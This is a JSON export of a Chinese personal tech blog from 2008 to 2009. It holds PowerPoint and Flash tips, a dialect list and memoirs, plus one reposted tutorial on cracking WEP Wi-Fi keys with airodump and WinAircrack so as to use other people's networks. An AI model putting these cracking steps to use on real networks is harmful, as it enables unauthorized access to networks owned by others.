{"posts":[{"title":"下载 Flash 动画的几种方法","text":"近几年来 ,Flash 在网络上风光无限。矢量格式的动画，在 网络带宽 普遍不“宽”的今天，为多媒体应用提供了优秀的平台。随着它的流行，大量动画作品出现在网络上，其中不乏精品。因为不能使用右键的复制下载，怎样把这些好东东下载到硬盘上就成了问题，本文讲述几种有效的方法解决这个问题。一、四两拨千斤 当网页为 Flash 动画提供下载链接的时候直接右键另存为下载即可，省去了查找下载地址的麻烦。如果，还没有下载链接，我们还有别的好办法。1 、查看 源文件 在 IE 中， 点击 菜单栏中的“查看”下的“源文件”，当前网页的代码会被记事本打开。在记事本中，按“ ctrl+F ”，弹出查打对话框，在“查找内容”下，填入“ swf ”，点“查找下一个”按钮，就可以找到 falsh 文件的链接（例如： http://download .mac romedia.com/pu b/s hockwave/cabs/flash/a.swf ）。再用网际快车下载既可。2 、查看页面链接 如果你使用的是 MYIE2 ，那就更方便了。点击菜单栏下的“查看”下的“页面链接”或直接按“ Alt+L ”快捷键。如果，你在这一次起动 MYIE2 后没有查看过该页的链接，那么系统会出现一个提示框（如图 1 ）。 图 1 如果点“是”，页面中的所有链接都会列出，如果点“否”会出现下一个提示框（如图 2 ）， 图 2 点“确定”既可弹出“页面链接”对话框（如图 3 ）。 图 3 点“ Binaries ”后面列表框中的向下箭头，选“ .swf ”，页面中的 falsh 文件的链接就会被列出来，而且是以超链接的形式列出（如图 4 ）。点击链接可以打开该文件，在链接上右击，在弹出菜单出选择你所使用的下载工具，如“使用网际快车下载”，这样就可以调用下载工具下载了。 图 4 myie2 的主页： http://www.myie2.com/ 天极网下载中心 myie2 下载页面： http://www.mydown.com/servlet/mydown.yeskydown?tag=4&amp;objID=759653 、站点资源探测器 网际快车提供了一个探测站点资源的工具，我们可以像操作本地的资源管理器一样查看并下载网站的文件。 打开网际快车，点击菜单栏“工具”下的“站点资源探测器”或真接按快捷键“ F7 ”，起动程序。在“地址”栏中填入要搜索的网址（如图 5 ），回车。 图 5 点菜单栏“编辑”下的“过滤”，选中“只显示以下类型”单选框，在下面的“文件类别”中修改为“ .swf ”（如图 6 ） , 点“确定”完成。 图 6 这样做的目的是：只显示我们需要查找的文件类型。在列出的 falsh 文件上右击（如图 7 ），点“下载”就会自动调用网际快车的下载工具下载。 图 7 网际快车主页： http://www.amazesoft.com/ 天极网下载中心网际快车下载页面： http://download.yesky.com/servlet/mydown.yeskydown?tag=4&amp;objID=48384二、因地制宜如果，网站进行了加密处理，上述方法就不起作用了。我们就需要用下面的方法。 我们知道，使用 IE 上网，浏览过的网页会被放在 IE 临时文件夹里面，所以可以在那里找到 Flash 文件。IE 临时文件夹默认位置是在系统盘中，有经验的朋友早以把它移出了系统盘，现在看看怎样查找它的所在位置。 通过 IE 菜单栏中的 “ 工具 “ 下的 “Internet 选项 “ 打开 “Internet 选项 “ 对话框， 点 “Internet 临时文件 “ 下的设置按钮（如图 8 ），弹出 “ 设置 “ 对话框，点 “ 查看文件 “ （如图 9 ），打开 IE 临时文件夹。 图 8 图 9 在空白处右击，选 “ 查看 “ 下的 “ 详细信息 “ ，再点 “ 类型 “ 列中的 “ 类型 “ 按钮。再找到后缀名为 SWF 的文件。IE 临时文件夹属于系统文件夹，直接在里面搜索文件不能显示出文件大小，给我们带来了许多麻烦。复制一个 IE 临时文件夹可以避开这一点。在上一步中，进入 IE 临时文件夹后，点工具栏上的 “ 向上 “ 按钮，再复制该文件夹。然后在备件的文件夹中按 “ctrl+f” 进行查找，选 “ 所有文件和文件夹 “ ，在下一步中填入文件名： “*.swf” ，再点查找。查找完后，点大小栏中的大小按钮，让文件从大到小排列，一般我们要找的动画应该是比较大文件（如图 10 ）。 图 10 三、边看边存 如果你网速比较快，你也可以边看边存，只需使用一个小工具网络猎手 Internet Hunter for Flash ，（如图 11 ）。 图 11 下载安装后，它会在 IE 中集成一个新功能：在 IE 打开的网页上如果有 flash 动画，把光标移动画上，就会出现下载工具条（如图 12 ）。点左边的小软盘图标，保存文件。在弹出对话框中点“ save ”。文件保存在网络猎手的安装目录下。 图 12 摘自：http://www.diannao100.com/xiazai/flash/2003364.htm","link":"/2008/154_2008-12-2110_49/"},{"title":"PPT里插入Flash（*.SWF）文件方法","text":"① 执行“视图→工具栏→控件工具箱”命令，展开“控件工具箱”工具栏（如图K）。② 单击工具栏上的“其他控件”按钮，在弹出的下拉列表中，选“ShockwaveFlashObject”选项，这时鼠标变成了细十字线状，按住左键在工作区中拖拉出一个矩形框（此为后来的播放窗口）。③ 将鼠标移至上述矩形框右下角成双向拖拉箭头时，按住左键拖动，将矩形框调整至合适大小。④ 右击上述矩形框，在随后弹出的快捷菜单中，选“属性”选项，打开“属性”对话框（如图L），在“Movie”选项后面的方框中输入需要插入的Flash动画文件名及完整路径，然后关闭“属性”窗口。[注意]：为便于移动演示文稿，最好将Flash动画文件与演示文稿保存在同一文件夹中，这时，上述路径也可以使用相对路径。","link":"/2008/157_2008-12-1613_23/"},{"title":"PowerPoint中插入视频的三种方法","text":"为了能更好地帮助大家合理地在PowerPoint课件中插入和播放视频文件，本文特向大家介绍PowerPoint中插入和处理视频的三种方法。 直接播放视频 这种播放方法是将事先准备好的视频文件作为电影文件直接插入到幻灯片中，该方法是最简单、最直观的一种方法，使用这种方法将视频文件插入到幻灯片中后，PowerPoint只提供简单的[暂停]和[继续播放]控制，而没有其他更多的操作按钮供选择。因此这种方法特别适合PowerPoint初学者，以下是具体的操作步骤： 1. 运行PowerPoint程序，打开需要插入视频文件的幻灯片。 2. 将鼠标移动到菜单栏中，单击其中的“插入”选项，从打开的下拉菜单中执行“插入影片文件”命令。 3. 在随后弹出的文件选择对话框中，将事先准备好的视频文件选中，并单击[添加]按钮，这样就能将视频文件插入到幻灯片中了。 4. 用鼠标选中视频文件，并将它移动到合适的位置，然后根据屏幕的提示直接点选[播放]按钮来播放视频，或者选中自动播放方式。 5. 在播放过程中，可以将鼠标移动到视频窗口中，单击一下，视频就能暂停播放。如果想继续播放，再用鼠标单击一下即可。 插入控件播放视频 这种方法就是将视频文件作为控件插入到幻灯片中的，然后通过修改控件属性，达到播放视频的目的。使用这种方法，有多种可供选择的操作按钮，播放进程可以完全自己控制，更加方便、灵活。该方法更适合PowerPoint课件中图片、文字、视频在同一页面的情况。 1. 运行PowerPoint程序，打开需要插入视频文件的幻灯片。 2. 将鼠标移动到菜单栏，单击其中的“视图”选项，从打开的下拉菜单中选中“控件工具箱”，再从下级菜单中选中[其他控件]按钮。 3. 在随后打开的控件选项界面中，选择“Windows Media Player”选项，再将鼠标移动到PowerPoint的编辑区域中，画出一个合适大小的矩形区域，随后该区域就会自动变为Windows Media Player的播放界面（如图1）。 4. 用鼠标选中该播放界面，然后单击鼠标右键，从弹出的快捷菜单中选择“属性”命令，打开该媒体播放界面的“属性”窗口。 5. 在“属性”窗口中，在“File Name”设置项处正确输入需要插入到幻灯片中视频文件的详细路径及文件名。这样在打开幻灯片时，就能通过[播放]控制按钮来播放指定的视频了。 6. 为了让插入的视频文件更好地与幻灯片组织在一起，还可以修改“属性”设置界面中控制栏、播放滑块条以及视频属性栏的位置。 7. 在播放过程中，可以通过媒体播放器中的[播放]、[停止]、[暂停]和[调节音量]等按钮对视频进行控制。 插入对象播放视频 这种方法是将视频文件作为对象插入到幻灯片中的，与以上两种方法不同的是，它可以随心所欲地选择实际需要播放的视频片段，然后再播放。实现步骤为： 1. 打开需要插入视频文件的幻灯片，单击“插入/对象”命令，打开“插入对象”对话框。 2. 选中“新建”选项后，再在对应的“对象类型”设置栏处选中“视频剪辑”选项，单击[确定]按钮（如图2）。 3. PowerPoint自动切换到视频属性设置状态，执行“插入剪辑/Windows视频”命令，将事先准备好的视频文件插入到幻灯片中。 4. 执行“编辑/选项”命令，打开选项设置框，在其中设置视频是否需要循环播放，或者是播放结束后是否要倒退等，单击[确定]返回到视频属性设置界面。 5. 点选工具栏中的视频[入点]按钮和[出点]按钮，重新设置视频文件的播放起始点和结束点，从而达到随心所欲地选择需要播放视频片段的目的。 6. 用鼠标左键单击设置界面的空白区域，就可以退出视频设置的界面，从而返回到幻灯片的编辑状态。还可以使用预览命令，检查视频的编辑效果。","link":"/2008/158_2008-12-1613_12/"},{"title":"利用注册表将IE7的菜单栏提到上方","text":"新版的 Internet Explorer 7 浏览器将菜单栏移到了导航栏的下面，不习惯这一布局的朋友可以用以下方法让IE7的菜单栏重新回到浏览器的顶部。对于新发布的IE7简体中文版,可能在外观上和IE6不同,特别是菜单栏无法显示或无法置顶,方法如下：1、点击开始，运行，接着在运行框输入：regedit.exe2、点击确定进入注册表编辑器3、找到以下键值：HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Toolbar\\WebBrowser4、点击注册表编辑器的编辑菜单5、选择新建 ——&gt; DWORD 值6、在右侧突出显示的新值中输入ITBar7Position7、双击新建立的 ITBar7Position 项8、将数值数据改为19、关闭注册表编辑器，打开IE7看看菜单栏是不是回到顶部 注意：此功能启用后某些安全软件会提示发现恶意插件，选择信任即可。","link":"/2008/160_2008-12-1213_55/"},{"title":"巧妙运用WinRAR的自解压功能创建更小的安装程序","text":"现在的游戏安装包都十分庞大如果你经常在网吧等地玩网吧里没有的游戏，就要等待一段漫长的下载时间。这里以《QQ飞行岛》为例，介绍一下怎样缩小大型软件/游戏安装包。第一步：右击游戏安装文件夹，选择“添加到压缩文件”。第二步：选中“创建自解压格式压缩文件”，并设定好路径及文件名。进入“高级”选项卡中的“自解压选项…”。第三步：在解压路径中选择“在‘Program File’中创建”，也可以选别的。选好后进入“高级”选项页中的“添加快捷方式”。第四步：在弹出的对话框中设定好参数后按确定即可，快捷方式可重复添加。完成后来到“文本和图标”页。第五步：在此页中设置好自己想要的显示内容（注意：徽标要用BMP文件，图标要用ICO文件）。设定好后进入“许可”页输入许可内容——这是各种安装文件中不可缺少的内容，但不写也行。第六步：检查一下设置是否全部正确（压缩是一个漫长的过程，且压缩后无法再更改上面我们设置的内容，所以建议检查一遍），确认无误后确定-确定就开始压缩了。压缩率高达24%之大！ {截图出问题了，加载不上，敬请谅解}","link":"/2008/161_2008-12-1213_54/"},{"title":"Powerpoint特殊动画效果制作方法","text":"PowerPoint（简称PPT）的动画设计功能丰富且使用方便。下面我们通过一个具体的制作实例，向大家详细介绍PowerPoint 2002的动画设计功能。 PowerPoint 2002的所有动画设计功能都集成到任务窗格中。如果大家没有看到任务窗格，请选择“视图”菜单中的“任务窗格”命令。任务窗格中含有“幻灯片设计—动画方案”、“自定义动画”和“幻灯片切换”等有关动画设计的面板。 PowerPoint可分别针对整张幻灯片和每张幻灯片中的各类元素进行动画效果设定。对于整张幻灯片的动画效果，PowerPoint 2002提供了丰富的切换效果样式，可以在“幻灯片切换”任务窗格面板中，对选定的（或是全部）幻灯片直接进行套用，并且还能设定切换时的速度、声音和切换方式（鼠标单击或使用排练计时）。下面的制作实例中，将重点介绍针对幻灯片中的各类元素的动画设计。 一、制作第一张幻灯片 以制作一篇介绍学校中主要人物的演示文稿为例。制作前先准备好所需的图片、声音等素材。 制作第1张幻灯片，其中包含4个人物的头像和姓名。大致播放效果为：首先有“学校主要领导介绍”字样的标题从屏幕右侧飞入，然后在屏幕中央渐渐出现一个图标，图标完全显现后绕着特定的曲线运动到屏幕右上角停止。然后每点击一次鼠标，就会以不同的动画效果出现一个人物头像的图片及其对应的人名。 1.新建一张幻灯片 在“幻灯片版式”和“幻灯片设计—设计模板”任务窗格中，分别为它套用一种版式和一种设计模板。这里我们选用的是“标题，内容与文本”版式和“Digital Dots”模板，大家也可以根据需要选用其他类型的版式和模板。然后在幻灯片中输入标题、项目文本（这里为4个人物的名字）和插入图片（这里为4个人物头像的图片），并调整好其大小和位置。 2.调用预置的动画方案 PowerPoint 2002中新增了动画方案功能，可以将一组预定义的动画和切换效果应用于幻灯片中的文本，适用于标题、项目符号或段落文本。直接套用动画方案，可大大加快幻灯片中动画效果设计的进程。在“幻灯片设计—动画方案”任务窗格中，提供了丰富的动画方案，可应用于选定的幻灯片或所有幻灯片。选用后，会在设计窗口中播放所选方案的预览效果。这里我们选用“升起”动画方案。 3.自定义动画效果 切换到“自定义动画”任务窗格后，可以看到自定义动画列表。自定义动画列表显示的是当前幻灯片中所有应用了动画效果的元素及其对应的动画效果设置。列表中包含多个列表项目，每个项目表示一个动画事件。在幻灯片播放时按照由上至下的顺序对自定义动画列表中的动画事件进行播放，我们可通过下面的“重新排序”的上下箭头按钮来调整上下顺序。在这个实例中，由于已在上面的步骤中应用PowerPoint 2002自带的“升起”动画方案，所以在自定义动画列表中可以看到标题和项目文本的动画列表项目。这里共包含了4个项目文本的列表项目，我们可点击向上和向下的小箭头来分别进行展开和折叠。选中某一个列表项目后，可以更改有关这个动画事件的效果设置。这里我们可先选中标题列表项目，然后点击“更改”按钮，在弹出菜单中选用“进入”→“飞入”效果（图1），并在下面的多个下拉菜单中设定“飞入”效果的开始时间、方向和速度。 需要说明的是，PowerPoint 2002中为动画效果提供了3种基本类型的开始时间，分别为“单击”、“之前”和“之后”。“单击”表示通过鼠标单击可触发动画事件，动画列表项目前，会有一个鼠标的图样，并标有表示触发先后顺序的1、2、3……数字序列；“之前”表示在上一个动画事件被触发的同时，自动触发当前动画事件；“之后”表示在上一个动画事件播放完后，自动触发当前动画事件。动画列表项目前会有一个时钟的图样。而且，在动画列表项目右边的下拉菜单中选择“计时”命令，在弹出的对话框中还能设置上述3种开始时间的延时，精度可达到0.5秒（图2）。 在这个实例中，我们选中人物头像图片后，使用“添加效果”按钮分别为这4张图片添加4种不同的显示效果，每种效果添加后都可以预览。由于自定义动画列表中的项目在默认情况下，是按照添加的先后顺序排列的，为了在单击鼠标后，使人名和对应的头像图片同时出现，必须先展开人名列表项目，并调整头像图片列表项目的位置，使每个头像图片列表项目都直接位于所对应的人名列表项目的下面，最后还要将头像列表项目的开始时间设为“之前”，以便与人名同时出现。 4.运动路径的使用 在这一步中，我们制作一个先会渐渐显现，然后按照指定曲线运动的图标。首先准备好一个图标图像，最好先用图像处理软件将背景设置成透明。在幻灯片中插入这个图像，调整其大小、位置至幻灯片的中央。再为它添加“渐变”效果，然后在自定义动画列表中，将列表项目的位置调整到标题列表项目的下面，并设定开始时间为“之后”。这样就能使图标在标题飞入后自动渐渐显现。 在PowerPoint 2002中，一个元素可以添加多个动画效果，这样就能很容易设计出生动、精彩的动画。选中图标图像，再次点击“添加效果”按钮，并在下拉菜单中选择“运动路径”→“更多运动路径”命令，在弹出的对话框中有非常丰富的运动路径可供选用（图3）。 这里我们选用“向右弯曲”运动路径。然后回到幻灯片设计窗口中，可以看到添加的运动路径已由虚线标出，其两个端点处的绿色和红色箭头分别表示运动的起点和终点。选中运动路径后，我们不但能对它进行旋转、大小调整，还能使用其右键菜单中的命令进行“编辑顶点”、“关闭（开放）路径”和“反转路径方向”等操作，十分方便。除了直接调用或更改内置的运动路径外，我们也能自己动手绘制运动路径。最后别忘了我们起初所制定的动画效果出场顺序，把运动路径列表项目的位置调整到图标渐变效果列表项目的下面，并设定开始时间为“之后”。 二、用触发器来触发动画事件 至此，我们已经基本完成了第1张幻灯片的制作，相信大家已对PowerPoint 2002中的大部分动画设计操作较为了解了。这一步我们来制作第2张幻灯片，主要说明如何将元素作为触发器来触发动画事件。首先新建一张幻灯片，新建的幻灯片会自动套用与第1张幻灯片相同的设计模板，我们再将其版式设为“空白”。插入一张图片，并为它设定动画效果，如“渐变式缩放”。然后再插入另一幅作为触发器的图片。下面我们将这个动画事件的播放设定为由触发器来触发，而不是上文中提到的“单击”、“之前”或“之后”方式。在这个动画列表项目右边的下拉菜单中选择“计时”命令，在弹出的对话框中点击“触发器”按钮，选中下面的“单击下列对象时启动效果”选项，并在旁边的下拉列表中选择刚才插入的图标图像作为触发器。由触发器触发的动画事件元素的右上角会标有一个手形标记。另外，为了不使触发器在触发后挡住被触发的动画效果，可用其右键菜单中的“置于底层”命令，将它作为触发器的图片放到最下层。在播放时，只有当我们点击触发器才会触发指定的动画事件，这样就在设计上给了幻灯片制作者很大的灵活性。在PowerPoint 2002中，包括图片、文本、动作按钮等在内的众多元素都能作为触发器。 三、在幻灯片间建立超链接 接下来，我们再制作4张关于人物详细介绍的幻灯片，大家可充分发挥自己的创造力。做完后，切换到最初制作的第1张幻灯片，选中其中的一幅头像图片，在其右键菜单中选择“动作设置”命令，在弹出的对话框中的“单击鼠标”选项中，将这张图片链接到所对应的幻灯片上（图4）。 对其它3幅头像图片，也进行相应的链接操作。另外，还可以在4张人物详细介绍的幻灯片中，制作返回到第1张幻灯片的超链接。 最后，我们还可以进行一些诸如幻灯片切换效果、添加声音效果、排练计时等设置，大家根据自己的喜好充分发挥想象力吧。","link":"/2008/162_2008-12-0913_22/"},{"title":"正宗河南方言","text":"板凳叫蹲儿.我不叫我，我们不叫我们..叫俺!没有叫木牛鸡叫揪. 恶心叫格一女孩叫妞儿/妮er. 坏叫孬. 废物叫凹糟..发霉叫长bu.. 脚叫jio..上衣不叫上衣.叫布衫儿蹲不叫蹲. 叫古堆.什么不叫什么 叫啥 .脑袋叫 di 脑长了漂亮叫齐整 . 长了英俊叫派仗跑不叫跑叫瓦.呐喊叫斜货或者嗷嗷骄傲自满叫自闷儿 .腋下叫胳老我 瘙痒叫胳肢煽一巴掌叫呼一巴掌软弱叫面 霸道叫强量 推叫wong 骗叫quo 梳头叫拢头看住一个人可不顺了时候还会说：看你花哨了放东西，叫搁到那儿 掉地上叫掉嗲了人家=NIA 可好不叫可好叫可地道老实叫实受 没叫猫婆子不叫婆子叫刨. 媳妇叫袖 . 他的儿子叫：他了小 .父亲叫：爹 玉米叫 玉蜀黍 裤头 叫 裤叉儿 拖鞋 叫 拖拉板儿 可气蛋 叫 可各撩 沿着这条路走叫：压这儿走你干吗叫：你弄啥了他很坏叫：他是个赖孙或者叫他可孬孙他这人叫：他这货父亲 叫 百(标准的河南方言) 母亲 叫 埋(标准的河南方言) 毛巾 叫 手巾 擦擦背 叫 抹抹脊娘 早晨不叫早晨 叫清早 门后不叫门后 叫门各老你家 叫 恁家钥匙叫跃儿匙 吃药叫吃跃儿饿不叫饿 叫饥 被子 叫 盖力袜子 叫 wao （读音：一声 ）蹲下叫谷吨.恶心叫隔意.yanr4（昨天） zhu wanr（现在）ju wanr（立即） jiang ，jier（刚才）胡lian（胡说）ci(说大话).切菜板叫案板..夹菜叫刀菜.围巾叫围脖.经典：：：[把灯关了 叫 给灯兽儿捞灭]外面 叫 外先. 去里面叫 去刘 . 那个人叫 懦人 .舒服，爽，叫得劲..香菜 叫 言碎..送给别人东西叫信给nia..那边叫那腔..抱 = 布 .. （焦作）油条叫油莫..笔叫杯. 皮带叫裤腰掉..把煤火点着叫给煤火拢灼. 掏耳屎叫掏儿次.抹脸用的香香叫 雪花膏..用来扫面或刷锅的一种工具叫催数.爆米花叫绷玉蜀黍花儿..说小孩很调皮叫卓小可费受.小气叫 扣比三儿.. 很累叫使哩慌 ..下小雨叫滴星..尾巴 叫 以吧..动物的内脏 叫 肠子,肚子,不狼古子知了的幼虫叫怕差 .. 知了叫马几鸟..夸张叫带样儿..一边—— 一米儿..发呆——易睁..稀饭叫甜汤.这个叫捉．昨天叫夜些..什么都没有 叫空可楼儿..扫巴叫条树..不懂事 叫 不清杂儿..玉米棒叫玉蜀黍睡儿 ..笑话我呢？叫花叫我了？说女人张的漂亮叫桌妞张了可气挣..今天星期几了？叫今儿礼拜几了？三更半夜叫嘿地拌业. 打人耳光叫删你那脸类 ..","link":"/2009/114_2009-08-2311_15/"},{"title":"小众软件：BumpTop 酷炫 3D 桌面","text":"小众软件： BumpTop 酷炫 3D 桌面","link":"/2009/116_2009-04-2315_15/"},{"title":"走近计算机——我的五年电脑自学历程","text":"你问我为什么不写十年？10年前我还是个三岁BABY呢！有什么好写的？！我们家是03年购买电脑的（“鑫联盟”牌的，256M内存、预装XP在当时已经不赖了）。那一年，我玩了半年的“三维弹球”——甚至差一点打通关。里面任务什么的我都玩懂了，不像别人那样不让球掉下去就行。时光飞逝，眨眼04了。“开始-所有程序-游戏”已全被我摸透。怎么办？眼下没银子的我终于选择了自学电脑——当时我可是“三无”——无网无书无师啊！首先进攻Microsoft Office 2000（预装的），当然学这得先学会打字，于是我抱着作文本狂练。功夫不负有心人，终于出了喜人成绩……呼！后来就不说了。Office后，WMP、Outlook等XP自带的工具全被我翻了一遍……对了，有一件事我至今难忘—— 那天我正沉迷于“C:\\Windows\\System32”[里面有许多宝贝哦，你也可以去看看]。打开某个程序（具体什么名我忘了），发现是一个向导，调整屏幕字体大小用的，我选了一个合适的，点击“完成”……屏幕一下子黑了，又亮了。可……可画面却一下子翻转了过来，倒了！ 我快哭了……【注：新版显卡驱动可以通过设置把画面正过来，但我当时预装的驱动无此功能。】父母带着我到熟人家里费了好大劲才给修好。此后我再也不敢轻举妄动了06年，我终于说服妈妈并步入了Internet这个神奇的世界……辛苦啊！！！07年我一直支持腾讯，虽然腾讯不给我QQ号……08年初我替微机老师修了好几次电脑呢。当年末我才改行，成了软件试用“狂人”，还建立了Qzone来分享我的心得——好东西是要分享的嘛。好了，不说了，我要“淘软”去啦！","link":"/2009/117_2009-04-1210_54/"},{"title":"小众软件：Solid Capture 3 免费赠送正版授权","text":"小众软件： Solid Capture 3 免费赠送正版授权","link":"/2009/118_2009-04-0418_45/"},{"title":"我的十年感言","text":"【回忆1998年】 那是偶才3岁呢，正在幼儿园对面服装市场里的托儿所天真。只记得那里的男老师很厉害哈。【回忆1999年】 偶上幼儿园啦！在河南省实验幼儿园，开学第一天偶上楼时感到楼梯很神奇——稚！第一天偶哇哇了三次，第二天两次，第三天一次，以后就不哇了——这是我妈妈告诉我的……“1999年2月，腾讯QQ诞生”，腾讯？什么是腾讯？什么是Tencent？【回忆2000年】 ……无记忆……【回忆2001年】 让我想想……对了，有一次看动画片我还清楚记得——我爱片中的小鼯鼠~【回忆2002年】 小学——小学！【回忆2003年】 第一次遇见Computer这个神奇而又诡异的东西，还以为是生物呢！【回忆2004年】 我的电脑自学旅程就是从这一年开始的。当时我可是“三无”——无网无书无老师，要不是学习紧我现在早会编程了。【回忆2005年】 好像没什么吧……1、神舟六号载人航天飞行圆满成功。2、人民币采取弹性汇率机制。3、松花江发生重大水污染事件。4、2005年10月，腾讯总部大楼奠基-网络航母再创高峰。【回忆2006年】 2006年6月，QQ最高同时在线用户突破2000万！有我的功劳哦。那时我已是“腾讯族”了。【回忆2007年】 2007年5月，腾讯成立公益慈善基金会, 市值超过1000亿。我骄傲！【回忆2008年】 1、北京成功举办奥运会，中国51金首登金牌榜首。2、全国众志成城抗冻灾；四川汶川5·12强烈地震。3、金融风暴席卷全球。去年这么多事啊，2008是最令我难忘的。哦对了，我的Qzone是今年开通的哦——tiantangma08.qzone.qq.com","link":"/2009/119_2009-04-0418_20/"},{"title":"小众软件：Portable Ubuntu 在 Windows 里运行 Ubuntu","text":"小众软件： Portable Ubuntu 在 Windows 里运行 Ubuntu","link":"/2009/120_2009-04-0417_34/"},{"title":"小众软件：7Zip Theme Manager 轻松美化 7Zip","text":"小众软件： 7Zip Theme Manager 轻松美化 7Zip","link":"/2009/121_2009-04-0318_54/"},{"title":"小众软件：High Sign 开源鼠标手势[.net]","text":"小众软件： High Sign 开源鼠标手势[.net]","link":"/2009/124_2009-03-3013_37/"},{"title":"破解无线网络密码、无线网络！WinAircrackPack使用教程","text":"随着社会的进步！WIFI上网日益普及,特别是大城市中随便在一个小区搜索一下就能找到好多热点,搜索到热点然后链接上去那么我们就可以尽情的享受免费上网服务了。 破解静态WEP KEY全过程首先通过NetStumbler确认客户端已在某AP的覆盖区内，并通过AP信号的参数进行‘踩点’（数据搜集）。 通过上图的红色框框部分内容确定该SSID名为demonalex的AP为802.11b类型设备，Encryption属性为‘已加密’，根据802.11b所支持的算法标准，该算法确定为WEP。有一点需要注意：NetStumbler对任何有使用加密算法的STA[802.11无线站点]都会在Encryption属性上标识为WEP算法，如上图中SSID为gzpia的AP使用的加密算法是WPA2-AES。 我们本次实验的目的是通过捕捉适当的数据帧进行IV（初始化向量）暴力破解得到WEP KEY，因此只需要使用airodump.exe（捕捉数据帧用）与WinAircrack.exe（破解WEP KEY用）两个程序就可以了。 首先打开ariodump.exe程序，按照下述操作： 首先程序会提示本机目前存在的所有无线网卡接口，并要求你输入需要捕捉数据帧的无线网卡接口编号，在这里我选择使用支持通用驱动的BUFFALO WNIC—编号‘26’；然后程序要求你输入该WNIC的芯片类型，目前大多国际通用芯片都是使用‘HermesI/Realtek’子集的，因此选择‘o’；然后需要输入要捕捉的信号所处的频道，我们需要捕捉的AP所处的频道为‘6’；提示输入捕捉数据帧后存在的文件名及其位置，若不写绝对路径则文件默认存在在winaircrack的安装目录下，以.cap结尾，我在上例中使用的是‘last’； 最后winaircrack提示：‘是否只写入/记录IV[初始化向量]到cap文件中去？’，我在这里选择‘否/n’；确定以上步骤后程序开始捕捉数据包。 下面的过程就是漫长的等待了，直至上表中‘Packets’列的总数为300000时即可满足实验要求。根据实验的经验所得：当该AP的通信数据流量极度频繁、数据流量极大时，‘Packets’所对应的数值增长的加速度越大。当程序运行至满足‘Packets’=300000的要求时按Ctrl+C结束该进程。 此时你会发现在winaircrack的安装目录下将生成last.cap与last.txt两个文件。其中last.cap为通用嗅探器数据包记录文件类型，可以使用ethereal程序打开查看相关信息；last.txt为此次嗅探任务最终的统计数据（使用‘记事本/notepad’打开last.txt后得出下图）。 下面破解工作主要是针对last.cap进行。首先执行WinAirCrack.exe文件： 单击上图红色框框部分的文件夹按钮，弹出*.cap选定对话框，选择last.cap文件，然后通过点击右方的‘Wep’按钮切换主界面至WEP破解选项界面： 选择‘Key size’为64（目前大多数用户都是使用这个长度的WEP KEY，因此这一步骤完全是靠猜测选定该值），最后单击主界面右下方的‘Aircrack the key…’按钮，此时将弹出一个内嵌在cmd.exe下运行的进程对话框，并在提示得出WEP KEY： 打开无线网卡的连接参数设置窗口，设置参数为： SSID：demonalex 频道：6 WEP KEY：1111122222（64位） OK，现在可以享受连入别人WLAN的乐趣了。 本文转自玩家网(http://www.cngba.com) 详文：http://psp.cngba.com/psprjjc/2008051235540.shtml","link":"/2009/123_2009-03-3013_53/"},{"title":"小众软件：Color Console 增强版命令行提示符","text":"小众软件： Color Console 增强版命令行提示符","link":"/2009/125_2009-03-2910_38/"},{"title":"小众软件：Funny Cursor 搞怪的鼠标指针[愚人节]","text":"小众软件： Funny Cursor 搞怪的鼠标指针[愚人节]","link":"/2009/126_2009-03-2910_36/"},{"title":"小众软件：IP 雷达 即时显示电脑网络使用情况","text":"小众软件： IP 雷达 即时显示电脑网络使用情况","link":"/2009/128_2009-03-2215_55/"},{"title":"小众软件：TeamViewver 小巧强大的远程控制软件","text":"小众软件： TeamViewver 小巧强大的远程控制软件","link":"/2009/129_2009-03-2018_04/"},{"title":"小众软件：Win7 Appinn Desktop 模拟 Windows 7 的盲按显示桌面效果","text":"小众软件： Win7 Appinn Desktop 模拟 Windows 7 的盲按显示桌面效果","link":"/2009/130_2009-03-2018_01/"},{"title":"时间之马","text":"转自曹文轩博客http://blog.sina.com.cn/caowenxuan 人类发明了钟表。它的一年四季有规律的走动，强化了时间之箭绝对向前飞逝的机械性。钟表是时间悲剧性的象征。它意味着我们对时间节奏的永恒而无可奈何。牛顿说：“绝对的、真正的和数学的时间自身在流逝着，而且由于其本性，在均匀地、与任何其他外界事物无关地流逝着……。”（牛顿《自然哲学与数学原理》）均匀，也可以被看成是一种自然之美。它意味着稳定，但也同时意味着它的不可改变与僵直。 对于小说而言，均匀的时间速度，是一种不可取的速度。 小说的速度是双重性的：故事的时间速度与叙述的时间速度。无论是前者或是后者，这两种速度都不宜是均匀的。因为均匀意味着节奏的丧失。人的心脏之跳动，其节奏均匀，是一种健康的表现——心律不齐或心速过动，则都是病兆。而小说的生命的魅力与生动，恰恰体现在一种速度的变化不停又恰到好处的节奏上。 关于节奏的奥秘以及它对于小说的意义，我们马上就要讲到。这里先说一点：节奏是形成美感的不可或缺的因素——节奏本身就是可被审美的。足球的迷人，正在于它是一种最富节奏感的运动。越是高水平的足球，就越是有节奏感。那些被认为是大腕球星的运动员，正在于它们对足球的富有节奏性的把握。他们在众目睽睽之下，运着球，慢速、快速、突进，又忽然地停顿或一个旋身改变方向，我们看到足球像一个音符在运行与跳动，当它应声入网时，我们的感受则与听到音乐的最强音时受其震撼的感觉如出一辙。节奏还意味着成熟与老练，意味着它是获取胜利的一种因素。无论是足球，或是其它，甚至包括一个人对他一生的安排，都应当掌握和保持好一种节奏。 均匀并非不能作为一种节奏存在于小说，就像它并非不能作为一种节奏存在于音乐一样。一首音乐中，总有节奏均匀的部分，并且正是均匀部分衬托出不均匀——没有均匀也就没有不均匀。我们在一段有规则的摇摆中，在不紧不慢地地随着音乐之流向前流淌或奔泻，觉得这是理所当然，甚至是我们所渴望的。但是这种流淌或是奔泻如果是由始至终的，则是我们所不能接受的。没有变化的节奏，将产生催眠的效果，或引起我们的压抑、烦躁与沉闷感，最终会因为感到它枯燥无味而终于失去欣赏的耐心。一年一度的奥地利维也纳新年音乐会上，我们从那个叫卡拉扬的或者叫小泽征尔的指挥家的身体摇摆与手势上，充分领略到了什么叫节奏与什么是节奏的魅力。 好的小说，都是那种在节奏的掌握上很有算计亦很娴熟的小说。从某种意义上讲，一位小说家是否已是修炼到家的小说家，仅从他在节奏的掌握一项上看便可认定。 与节奏相关的概念就是速度——减速与加速。 泛泛地谈减速与加速并无意义。因为无论是减还是加，完全是根据某种目的的需要来设定的。 